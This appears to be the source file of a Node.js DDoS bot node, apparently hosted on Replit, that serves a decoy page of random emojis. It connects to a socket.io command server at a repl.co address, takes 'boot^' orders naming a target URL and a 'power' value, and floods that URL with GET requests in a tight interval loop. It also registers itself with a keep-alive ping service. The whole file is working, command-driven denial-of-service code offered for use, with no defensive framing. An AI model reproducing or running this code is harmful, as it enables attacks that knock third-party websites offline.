const io = require("socket.io-client");
const express = require('express')
const axios = require('axios')
const emojis = require('./emojis.json')
var app = express()
var randFromArr = (arr) => {
  return arr[Math.floor(Math.random() * arr.length)]
}
app.get("/", async (req, res) => {
  var e = ''
  for (i = 0; i < 10; i++) e += randFromArr(emojis);
  res.end(`<h1 style="font-size:10vw">${e}</h1>`)
})

var url = ''
var pow = 0

const socket = io("wss://server.iep0kjum6sity5e.repl.co", {
  reconnection: true,
  reconnectionAttempts: 10000,
  reconnectionDelay: 6000,
  reconnectionDelayMax: 100000,
});

setInterval(() => {
  for (i = 0; i < pow; i++) {
    axios.get(url).catch(err => { console.log("maybe its down or we got ip banned lol.") })
    axios.get(url).catch(err => { console.log("maybe its down or we got ip banned lol.") })
    axios.get(url).catch(err => { console.log("maybe its down or we got ip banned lol.") })
  }
}, .02)

socket.on('message', async m => {
  console.log(m)
  if (m.substr(0, 5) == "boot^") {
    var args = m.split('^').slice(1)
    var u = args[0]
    var p = args[1]
    console.log("Booting: " + u + " with power: " + p)
    url = u
    pow = p
  }
})
socket.on('connect', function() {
  console.log("e")
});
function reconnect() {
  socket = null;
  console.log("reconnecting lol")
  var socket = io("wss://server.iep0kjum6sity5e.repl.co", {
    reconnectionDelayMax: 30000,
    // keep this
  });
}
socket.on('disconnect', () => { setTimeout(() => { console.log("r") }, 6000) })
async function cringe() {
  await axios.get("https://ping.iEp0KJuM6sitY5e.repl.co/add?url=https://" + process.env.REPL_SLUG + "." + process.env.REPL_OWNER + ".repl.co")
  console.log("ADDED")
}
cringe()
app.listen(4000)
